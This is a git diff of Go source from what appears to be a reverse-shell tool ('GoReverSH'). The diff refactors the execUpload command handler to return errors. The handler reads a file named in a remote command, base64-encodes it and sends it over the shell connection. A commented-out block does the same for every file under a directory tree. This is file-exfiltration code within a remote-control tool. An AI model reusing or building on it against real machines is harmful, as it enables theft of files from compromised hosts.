@@ -4,6 +4,7 @@ import (
 	"GoReverSH/config"
 	"context"
 	"encoding/base64"
+	"errors"
 	"fmt"
 	"io"
 	"log"
@@ -60,16 +61,94 @@ func (o *Observer) defectClient(client *Client) {
 	o.Sender.connectingClient = nil
 }
 
-func (o *Observer) execUpload(notice Notification) {
+//errorを返すようにする
+func (o *Observer) execUpload(notice Notification) error {
+	/*
+		commands := strings.Split(notice.Command, " ")
+		if len(commands) != 2 {
+			return errors.New("commands len not 2")
+		}
+		rootPath := commands[len(commands)-1]
+		fsys := os.DirFS(rootPath)
+		err := fs.WalkDir(fsys, ".", func(path string, d fs.DirEntry, err error) error {
+			if err != nil {
+				log.Println(err)
+				return errors.New("failed filepath.Walk: " + err.Error())
+			}
+			if d.IsDir() {
+				log.Println(1)
+
+				return nil
+			}
+
+			f, err := os.Open(rootPath + "/" + path)
+			if err != nil {
+				log.Println(err)
+
+				return err
+			}
+
+			fstats, err := f.Stat()
+			if err != nil {
+				log.Println(err)
+
+				return err
+			}
+
+			var content []byte
+			buff := make([]byte, 1024)
+			size := 0
+
+			for {
+				n, err := f.Read(buff)
+				if err != nil {
+					if n == 0 || errors.Is(err, io.EOF) {
+						break
+					}
+					log.Println(err)
+					break
+				}
+				//content + bufの中身を一時的に保存。
+				tmp := make([]byte, 0, size+n)
+				tmp = append(content[:size], buff[:n]...)
+				content = tmp
+				size += n
+				if n < 1024 {
+					break
+				}
+			}
+
+			imageToBase64 := base64.StdEncoding.EncodeToString(content)
+			fileinfo := utils.FileInfo{Name: "download/" + rootPath + "/" + path, Body: []byte(imageToBase64), Size: fstats.Size()}
+
+			output := utils.Output{Type: utils.FILE, FileInfo: fileinfo}
+
+			err = json.NewEncoder(o.Sender.connectingClient.Conn).Encode(output)
+			if err != nil {
+				return nil
+			}
+
+			f.Close()
+
+			return nil
+		})
+		if err != nil {
+			log.Println(err)
+			return err
+		}
+
+		return nil
+	*/
+
 	commands := strings.Split(notice.Command, " ")
 	if len(commands) != 2 {
-		return
+		return errors.New("command len is mnot 2")
 	}
 	o.Sender.SendMessage(notice.Command)
 	file, err := os.Open(commands[len(commands)-1])
 	if err != nil {
 		log.Println(err)
-		return
+		return err
 	}
 
 	//read
@@ -100,6 +179,8 @@ func (o *Observer) execUpload(notice Notification) {
 	//fmt.Println(string(content))
 	dataToBase64 := base64.StdEncoding.EncodeToString(content)
 	o.Sender.SendMessage(dataToBase64)
+
+	return nil
 }
 
 func (o *Observer) execCreateFile(notice Notification) {
@@ -313,7 +394,7 @@ func (observer Observer) WaitNotice(ctx context.Context) error {
 				observer.Sender.SendMessage(notice.Command)
 
 			default:
-				log.Println(notice)
+				log.Println("command is not found")
 			}
 		}
 	}
